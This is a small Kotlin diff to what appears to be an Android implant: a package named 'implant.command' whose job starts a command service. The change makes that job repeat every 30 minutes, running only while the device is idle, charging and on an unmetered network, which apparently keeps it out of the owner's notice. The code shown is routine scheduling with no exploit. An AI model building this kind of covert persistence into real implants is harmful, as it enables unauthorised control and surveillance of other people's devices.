@@ -2,6 +2,7 @@ package com.cooperthecoder.implant.command
 
 import com.evernote.android.job.Job
 import com.evernote.android.job.JobRequest
+import java.util.concurrent.TimeUnit
 
 
 class StartCommandServiceJob: Job() {
@@ -13,6 +14,7 @@ class StartCommandServiceJob: Job() {
             // Do this plugged in on an unmetered network when the device is idle.
             JobRequest.Builder(JOB_NAME)
                     .setRequiredNetworkType(JobRequest.NetworkType.UNMETERED)
+                    .setPeriodic(TimeUnit.MINUTES.toMillis(30))
                     .setRequiresDeviceIdle(true)
                     .setRequiresCharging(true)
                     .setRequirementsEnforced(true)
